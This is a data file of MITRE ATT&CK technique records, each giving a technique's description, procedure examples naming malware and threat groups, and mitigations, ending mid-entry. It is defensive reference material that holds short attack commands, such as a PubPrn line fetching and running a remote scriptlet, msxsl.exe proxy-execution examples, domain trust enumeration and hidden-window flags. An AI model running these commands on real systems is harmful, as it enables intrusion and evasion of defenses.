{"text": " Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "idx": "https://attack.mitre.org/techniques/T1132", "title": "Data Encoding", "entity": "Data Encoding", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. ", "After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64.", "H1N1 obfuscates C2 traffic with an altered version of base64.", "Ursnif has used encoded data in HTTP URLs for C2.\t", "Linux Rabbit sends the payload from the C2 server as an encoded URL parameter. "], "is_subtechnique": false}
{"text": " Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/005", "title": "Thread Local Storage", "entity": "Thread Local Storage", "entity_type": "techniques", "entity_context": ["Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Ursnif has injected code into target processes via thread local storage callbacks."], "is_subtechnique": true}
{"text": " Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor", "idx": "https://attack.mitre.org/techniques/T1484/001", "title": "Group Policy Modification", "entity": "Group Policy Modification", "entity_type": "techniques", "entity_context": ["Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.", "Indrik Spider has used Group Policy Objects to deploy batch scripts.", "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later).", "Empire can use <code>New-GPOImmediateTask</code> to modify a GPO that will install and execute a malicious Scheduled Task/Job.", "Egregor can modify the GPO to evade detection. "], "is_subtechnique": true}
{"text": " Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.", "idx": "https://attack.mitre.org/techniques/T1008", "title": "Fallback Channels", "entity": "Fallback Channels", "entity_type": "techniques", "entity_context": ["SslMM has a hard-coded primary and backup C2 string.", "TrickBot can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.", "DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.", "S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.", "Exaramel for Linux can attempt to find a new C2 server if it receives an error.", "ShimRat has used a secondary C2 location if the first was unavailable.\t", "Bazar has the ability to use an alternative C2 server if the primary server fails.", "Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.", "AppleSeed can use a second channel for C2 when the primary channel is in upload mode.", "InvisiMole has been configured with several servers available for alternate C2 communications.", "TAINTEDSCRIBE can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.", "Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.", "Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established.", "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.", "RDAT has used HTTP if DNS C2 communications were not functioning.\t", "CHOPSTICK can switch to a new C2 channel if the current one is broken.", "Cardinal RAT can communicate over multiple C2 host and port combinations.", "MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.", "PipeMon can switch to an alternate C2 domain when a particular date has been reached.", "Anchor can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.", "SideTwist has primarily used port 443 for C2 but can use port 80 as a fallback.", "Valak can communicate over multiple C2 hosts.", "RainyDay has the ability to switch between TCP and HTTP for C2 if one method is not working.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. ", "Machete has sent data over HTTP if FTP failed, and has also used a fallback server. ", "Linfo creates a backdoor through which remote attackers can change C2 servers.", "FatDuke has used several C2 servers per targeted organization.", "BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server.", "JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.", "HOPLIGHT has multiple C2 channels in place in case one fails.\t", "Crutch has used a hardcoded GitHub repository as a fallback channel.", "Stuxnet has the ability to generate new C2 domains.", "QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.", "WinMM is usually configured with primary and backup domains for C2 communications.", "Kazuar can accept multiple URLs for C2 servers.", "The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.", "OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.", "Ebury has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.", "BlackEnergy has the capability to communicate over a backup channel via plus.google.com.", "APT41 used the Steam community page as a fallback mechanism for C2. ", "FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.", "Derusbi uses a backup communication method with an HTTP beacon."], "is_subtechnique": false}
{"text": " Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)", "idx": "https://attack.mitre.org/techniques/T1482", "title": "Domain Trust Discovery", "entity": "Domain Trust Discovery", "entity_type": "techniques", "entity_context": ["AdFind can gather information about organizational units (OUs) and domain trusts from Active Directory.", "FIN8 has retrieved a list of trusted domains by using <code>Nltest.exe /domain_trusts</code>.", "QakBot can run <code>nltest /domain_trusts /all_trusts</code> for domain trust discovery.", "PowerSploit has modules such as <code>Get-NetDomainTrust</code> and <code>Get-NetForestTrust</code> to enumerate domain and forest trusts.", "Empire has modules for enumerating domain trusts.", "dsquery can be used to gather information on domain trusts with <code>dsquery * -filter \"(objectClass=trustedDomain)\" -attr *</code>.", "TrickBot can gather information about domain trusts by utilizing Nltest.", "Chimera has <code>nltest /domain_trusts</code> to identify domain trust relationships.", "PoshC2 has modules for enumerating domain trusts.", "APT29 used the <code>Get-AcceptedDomain</code> PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains.", "Nltest may be used to enumerate trusted domains by using commands such as <code>nltest /domain_trusts</code>.", "Employ network segmentation for sensitive domains..", "BloodHound has the ability to map domain trusts and identify misconfigurations for potential abuse.", "Bazar can use Nltest tools to obtain information about the domain.", "Map the trusts within existing domains/forests and keep trust relationships to a minimum."], "is_subtechnique": false}
{"text": " Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).", "idx": "https://attack.mitre.org/techniques/T1592/001", "title": "Hardware", "entity": "Hardware", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs) Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)", "idx": "https://attack.mitre.org/techniques/T1204/003", "title": "Malicious Image", "entity": "Malicious Image", "entity_type": "techniques", "entity_context": ["Train users to be aware of the existence of malicious images and how to avoid deploying instances and containers from them.", "Network prevention intrusion systems and systems designed to scan and remove malicious downloads can be used to block activity.", "Audit images deployed within the environment to ensure they do not contain any malicious components.", "TeamTNT relies on users to download and execute malicious Docker images.", "Utilize a trust model such as Docker Content Trust with digital signatures to ensure runtime verification of the integrity and publisher of specific image tags."], "is_subtechnique": true}
{"text": " Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network. Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)", "idx": "https://attack.mitre.org/techniques/T1199", "title": "Trusted Relationship", "entity": "Trusted Relationship", "entity_type": "techniques", "entity_context": ["Properly manage accounts and permissions used by parties in trusted relationships to minimize potential abuse by the party and if the party is compromised by an adversary.", "Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.", "menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.", "APT29 has used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.", "Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.", "Network segmentation can be used to isolate infrastructure components that do not require broad network access.", "GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers."], "is_subtechnique": false}
{"text": " Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn) Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).", "idx": "https://attack.mitre.org/techniques/T1216/001", "title": "PubPrn", "entity": "PubPrn", "entity_type": "techniques", "entity_context": ["On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.", "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.", "APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."], "is_subtechnique": true}
{"text": " Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS). On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys. Adversaries can use this to their advantage to", "idx": "https://attack.mitre.org/techniques/T1564/001", "title": "Hidden Files and Directories", "entity": "Hidden Files and Directories", "entity_type": "techniques", "entity_context": ["Lokibot has the ability to copy itself to a hidden file and directory.", "Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.", "WannaCry uses <code>attrib +h</code> to make some of its files hidden.", "LoudMiner has set the attributes of the VirtualBox directory and VBoxVmService parent directory to \"hidden\".", "Rocke downloaded a file \"libprocesshider\", which could hide files on the target system.", "Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.", "OSX/Shlayer executes a .command script from a hidden directory in a mounted DMG.", "Carberp has created a hidden file in the Startup folder of the current user.", "CoinTicker downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.random string/random string.", "InvisiMole can create hidden system directories.", "PoetRAT has the ability to hide and unhide files.", "Explosive has commonly set file and path attributes to hidden.", "NETWIRE can copy itself to and launch itself from hidden folders.", "FruitFly saves itself with a leading \".\" to make it a hidden file.", "ThiefQuest hides a copy of itself in the user's <code>~/Library</code> directory by using a <code>.</code> at the beginning of the file name followed by 9 random characters.", "MacSpy stores itself in <code>~/Library/.DS_Stores/</code> ", "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.", "SLOTHFULMEDIA has been created with a hidden attribute to insure it's not visible to the victim.", "Imminent Monitor has a dynamic debugging feature to set the file attribute to hidden.", "AppleJeus has added a leading <code>.</code> to plist filenames, unlisting them from the Finder app and default Terminal directory listings.", "Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.", "Agent Tesla has created hidden folders.", "Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name.", "APT32's macOS backdoor hides the clientID file via a chflags function.", "WastedLocker has copied a random file from the Windows System32 folder to the <code>%APPDATA%</code> location under a different hidden filename.", "Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.", "iKitten saves itself with a leading \".\" so that it's hidden from users by default.", "OSX_OCEANLOTUS.D sets the main loader file’s attributes to hidden.", "BackConfig has the ability to set folders or files to be hidden from the Windows Explorer default view.", "Tropic Trooper has created a hidden directory under <code>C:\\ProgramData\\Apple\\Updates\\</code> and <code>C:\\Users\\Public\\Documents\\Flash\\</code>.", "Ixeshe sets its own executable file's attributes to hidden.", "Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.", "Mustang Panda's PlugX variant has created a hidden folder on USB drives named <code>RECYCLE.BIN</code> to store malicious executables and collected data.", "Rising Sun can modify file attributes to hide files.", "APT28 has saved files with hidden file attributes.", "EnvyScout can use hidden directories and files to hide malicious executables.", "Dacls has had its payload named with a dot prefix to make it hidden from view in the Finder application.", "XCSSET uses a hidden folder named <code>.xcassets</code> and <code>.git</code> to embed itself in Xcode.", "The Komplex payload is stored in a hidden directory at <code>/Users/Shared/.local/kextd</code>."], "is_subtechnique": true}
{"text": " An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data. Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.", "idx": "https://attack.mitre.org/techniques/T1560/002", "title": "Archive via Library", "entity": "Archive via Library", "entity_type": "techniques", "entity_context": ["TajMahal has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.", "The ZLib backdoor compresses communications using the standard Zlib compression library.", "Cardinal RAT applies compression to C2 traffic using the ZLIB library.", "Denis compressed collected data using zlib.", "Epic compresses the collected data with bzip2 before sending it to the C2 server.", "SeaDuke compressed data with zlib prior to sending it over C2.", "InvisiMole can use zlib to compress and decompress data.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.", "BADFLICK has compressed data using the aPLib compression library.", "BBSRAT can compress data with ZLIB prior to sending it back to the C2 server.", "Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration."], "is_subtechnique": true}
{"text": " Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts. Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).", "idx": "https://attack.mitre.org/techniques/T1589/001", "title": "Credentials", "entity": "Credentials", "entity_type": "techniques", "entity_context": ["Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks.", "APT28 has harvested user's login credentials.", "Leviathan has collected compromised credentials to use for targeting efforts.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites."], "is_subtechnique": true}
{"text": " Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "idx": "https://attack.mitre.org/techniques/T1052", "title": "Exfiltration Over Physical Medium", "entity": "Exfiltration Over Physical Medium", "entity_type": "techniques", "entity_context": ["Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if they are not required for business operations. ", "Data loss prevention can detect and block sensitive data being copied to physical mediums.", "Limit the use of USB devices and removable media within a network."], "is_subtechnique": false}
{"text": " Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.", "idx": "https://attack.mitre.org/techniques/T1048/002", "title": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "entity": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. ", "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. ", "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.", "Data loss prevention can detect and block sensitive data being uploaded via web browsers.", "APT29 has exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.", "APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS."], "is_subtechnique": true}
{"text": " Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. On Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019) Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)", "idx": "https://attack.mitre.org/techniques/T1564/003", "title": "Hidden Window", "entity": "Hidden Window", "entity_type": "techniques", "entity_context": ["APT3 has been known to use <code>-WindowStyle Hidden</code> to conceal PowerShell windows.", "Metamorfo has hidden its GUI using the ShowWindow() WINAPI call. ", "APT32 has used the WindowStyle parameter to conceal PowerShell windows.  ", "APT19 used <code>-W Hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "HotCroissant has the ability to hide the window for operations performed on a given file.", "CopyKittens has used <code>-w hidden</code> and <code>-windowstyle hidden</code> to conceal PowerShell windows. ", "Higaisa used a payload that creates a hidden window.", "Gorgon Group has used <code>-W Hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "HAMMERTOSS has used <code>-WindowStyle hidden</code> to conceal PowerShell windows.", "Limit or restrict program execution using anti-virus software. On MacOS, allowlist programs that are allowed to have the plist tag. All other programs should be considered suspicious.", "Astaroth loads its module with the XSL script parameter <code>vShow</code> set to zero, which opens the application with a hidden window. ", "Deep Panda has used <code>-w hidden</code> to conceal PowerShell windows by setting the WindowStyle parameter to hidden. ", "Cuba has executed hidden PowerShell windows. ", "APT28 has used the WindowStyle parameter to conceal PowerShell windows. ", "Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.", "KeyBoy uses <code>-w Hidden</code> to conceal a PowerShell window that downloads a payload. ", "MCMD can modify processes to prevent them from being visible on the desktop.", "Agent Tesla has used <code>ProcessWindowStyle.Hidden</code> to hide windows.", "Kivars has the ability to conceal its activity through hiding active windows.", "WindTail can instruct the OS to execute an application without a dock icon or menu.", "PowerShower has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.", "InvisiMole has executed legitimate tools in hidden windows.", "Ursnif droppers have used COM properties to execute malware in hidden windows.", "Nomadic Octopus executed PowerShell in a hidden window. ", "StrongPity has the ability to hide the console window for its document search module from the user.", "DarkHydrus has used <code>-WindowStyle Hidden</code> to conceal PowerShell windows. ", "BONDUPDATER uses <code>-windowstyle hidden</code> to conceal a PowerShell window that downloads a payload."], "is_subtechnique": true}
{"text": " Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017) Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019) Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019) * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code> Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse", "idx": "https://attack.mitre.org/techniques/T1220", "title": "XSL Script Processing", "entity": "XSL Script Processing", "entity_type": "techniques", "entity_context": ["If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.", "Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.", "Higaisa used an XSL file to run VBScript code.", "Astaroth executes embedded JScript or 